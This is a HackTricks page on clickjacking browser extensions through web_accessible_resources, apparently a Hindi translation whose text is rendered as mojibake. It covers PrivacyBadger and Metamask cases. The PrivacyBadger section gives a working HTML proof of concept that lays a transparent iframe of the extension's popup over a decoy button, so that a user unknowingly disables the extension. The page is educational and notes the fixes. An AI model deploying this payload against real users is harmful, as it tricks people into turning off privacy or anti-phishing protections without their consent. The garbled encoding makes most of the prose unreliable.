# BrowExt - ClickJacking

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛ рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ рдХрд░реЗрдВ**.
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╢реЗрдпрд░ рдХрд░реЗрдВ.

</details>

## рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА

рдпрд╣ рдкреГрд╖реНрда рдПрдХ Browser extension рдореЗрдВ ClickJacking рднреЗрджреНрдпрддрд╛ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рд╣реИред\
рдпрджрд┐ рдЖрдкрдХреЛ рдирд╣реАрдВ рдкрддрд╛ рдХрд┐ ClickJacking рдХреНрдпрд╛ рд╣реИ, рддреЛ рджреЗрдЦреЗрдВ:

{% content-ref url="../clickjacking.md" %}
[clickjacking.md](../clickjacking.md)
{% endcontent-ref %}

Extensions рдореЗрдВ **`manifest.json`** рдлрд╝рд╛рдЗрд▓ рд╣реЛрддреА рд╣реИ рдФрд░ рдЙрд╕ JSON рдлрд╝рд╛рдЗрд▓ рдореЗрдВ `web_accessible_resources` рдирд╛рдордХ рдПрдХ рдлрд╝реАрд▓реНрдб рд╣реЛрддрд╛ рд╣реИред рдпрд╣рд╛рдБ [Chrome docs](https://developer.chrome.com/extensions/manifest/web_accessible_resources) рдХреНрдпрд╛ рдХрд╣рддреЗ рд╣реИрдВ:

> рдпреЗ рд╕рдВрд╕рд╛рдзрди рддрдм рдПрдХ рд╡реЗрдмрдкреЗрдЬ рдореЗрдВ URL **`chrome-extension://[PACKAGE ID]/[PATH]`** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЙрдкрд▓рдмреНрдз рд╣реЛрдВрдЧреЗ, рдЬрд┐рд╕реЗ **`extension.getURL method`** рдХреЗ рд╕рд╛рде рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯреЗрдб рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рдЙрдЪрд┐рдд CORS рд╣реЗрдбрд░реНрд╕ рдХреЗ рд╕рд╛рде рд╕реЗрд╡рд╛ рджреА рдЬрд╛рддреА рд╣реИ, рдЗрд╕рд▓рд┐рдП рд╡реЗ XHR рдЬреИрд╕реЗ рддрдВрддреНрд░реЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЙрдкрд▓рдмреНрдз рд╣реЛрддреЗ рд╣реИрдВред[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

рд╡реЗрдм рдПрдХреНрд╕реЗрд╕рд┐рдмрд▓ рд╣реЛрдиреЗ рдХреЗ рдЕрд▓рд╛рд╡рд╛, **`web_accessible_resources`** рдореЗрдВ рд╕рдВрд╕рд╛рдзрди extension рдХреА рдЕрдВрдмрд┐рдПрдВрдЯ рдЕрдереЙрд░рд┐рдЯреА рдХреЗ рд╕рд╛рде рдЪрд▓рддреЗ рд╣реИрдВ: рд╡реЗ рд╕реНрдЯреЗрдЯ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ, рдЕрдиреНрдп рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдХреБрдЫ рддрд░реАрдХреЛрдВ рд╕реЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ рдореЙрдбрд┐рдлрд╛рдИ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ `web_accessible_resources` рдореЗрдВ рдХреЛрдИ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреЛрдИ рджрд┐рд▓рдЪрд╕реНрдк рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рддреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕реЗ рдПрдХ рд╡реЗрдмрдкреЗрдЬ рдореЗрдВ рдПрдореНрдмреЗрдб рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЖрдЧрдВрддреБрдХреЛрдВ рдХреЛ рдЗрд╕реЗ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЪрд╛рд▓рд╛рдХреА рд╕реЗ рдмрд╣рдХрд╛ рд╕рдХрддрд╛ рд╣реИред

## PrivacyBadger рдЙрджрд╛рд╣рд░рдг

рдпрд╣ рдкрддрд╛ рдЪрд▓рд╛ рдХрд┐ extension PrivacyBadger рдореЗрдВ, `skin/` рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреА рд╕рд╛рдордЧреНрд░реА `web_accessible_resources` рдереА:
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
рддреЛ, `skin/popup.html` рд▓реЛрдб рдХрд░рдХреЗ, рдЬреЛ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рддрдм рдкреНрд░рджрд░реНрд╢рд┐рдд рд╣реЛрддрд╛ рд╣реИ рдЬрдм рдЖрдк рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдореЗрдВ PrivacyBadger рдЖрдЗрдХрди рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рддреЗ рд╣реИрдВ, **iframe рдореЗрдВ рдЗрд╕реЗ рд▓реЛрдб рдХрд░рдХреЗ рд╣рдо рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ "Disable PrivacyBadger for this Website" рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдзреЛрдЦрд╛ рджреЗ рд╕рдХрддреЗ рд╣реИрдВ**, рдЬрд┐рд╕рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдЕрддрд┐рд░рд┐рдХреНрдд рдЯреНрд░реИрдХрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдЦреЛрд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ PrivacyBadger рдХреЗ рдХрд╛рд░реНрдп рдХреЛ рдХрдордЬреЛрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред **ClickJacking рд╡реАрдбрд┐рдпреЛ рдЙрджрд╛рд╣рд░рдг рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ** [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm) рдореЗрдВред

рд╕рдорд╛рдзрд╛рди рдЖрд╕рд╛рди рдерд╛: **`web_accessible_resources` рд╕реЗ `/skin/*` рдХреЛ рд╣рдЯрд╛ рджреЗрдВ**ред

### PoC
```html
<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}

</style>

<div id="stuff">
<h1>
Click the button
</h1>
<button id="button">
click me
</button>
</div>

<iframe src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## Metamask рдЙрджрд╛рд╣рд░рдг

Metamask рдореЗрдВ ClickJacking рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдПрдХ [**рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ рдпрд╣рд╛рдБ рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)ред рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, Metamask рдиреЗ рдпрд╣ рдЬрд╛рдВрдЪ рдХрд░рдХреЗ рд╕реБрд░рдХреНрд╖рд╛ рднрдВрдЧ рдХреЛ рдареАрдХ рдХрд┐рдпрд╛ рдХрд┐ рдЗрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░реЛрдЯреЛрдХреЙрд▓ **`https:`** рдпрд╛ **`http:`** рдерд╛ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП **`chrome:`** рдирд╣реАрдВ):

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

**рдПрдХ рдФрд░ ClickJacking рдЬрд┐рд╕реЗ Metamask рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдореЗрдВ рдареАрдХ рдХрд┐рдпрд╛ рдЧрдпрд╛** рдерд╛ рд╡рд╣ рдпрд╣ рдерд╛ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **Click to whitelist** рдХрд░ рд╕рдХрддреЗ рдереЗ рдЬрдм рдПрдХ рдкреЗрдЬ рдХреЛ phishing рдХрд╛ рд╕рдВрджреЗрд╣ рд╣реЛрддрд╛ рдерд╛ рдХреНрдпреЛрдВрдХрд┐ `тАЬweb_accessible_resourcesтАЭ: [тАЬinpage.jsтАЭ, тАЬphishing.htmlтАЭ]`ред рдЪреВрдВрдХрд┐ рд╡рд╣ рдкреЗрдЬ Clickjacking рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдерд╛, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рдерд╛ рдХреБрдЫ рд╕рд╛рдорд╛рдиреНрдп рджрд┐рдЦрд╛рдХрд░ рддрд╛рдХрд┐ рдкреАрдбрд╝рд┐рдд рдмрд┐рдирд╛ рдзреНрдпрд╛рди рджрд┐рдП whitelist рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреНрд▓рд┐рдХ рдХрд░реЗ, рдФрд░ рдлрд┐рд░ phishing рдкреЗрдЬ рдкрд░ рд╡рд╛рдкрд╕ рдЬрд╛рдП рдЬреЛ whitelist рд╣реЛ рдЬрд╛рдПрдЧрд╛ред

## Steam Inventory Helper рдЙрджрд╛рд╣рд░рдг

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреЗрдЬ рдХреЛ рджреЗрдЦреЗрдВ рддрд╛рдХрд┐ рдЬрд╛рди рд╕рдХреЗрдВ рдХрд┐ рдХреИрд╕реЗ рдПрдХ **XSS** рдХреЛ рдПрдХ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдореЗрдВ **ClickJacking** рд╕реБрд░рдХреНрд╖рд╛ рднрдВрдЧ рдХреЗ рд╕рд╛рде рдЬреЛрдбрд╝рд╛ рдЧрдпрд╛ рдерд╛:

{% content-ref url="browext-xss-example.md" %}
[browext-xss-example.md](browext-xss-example.md)
{% endcontent-ref %}

## рд╕рдВрджрд░реНрдн

* [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) **рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ**ред
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
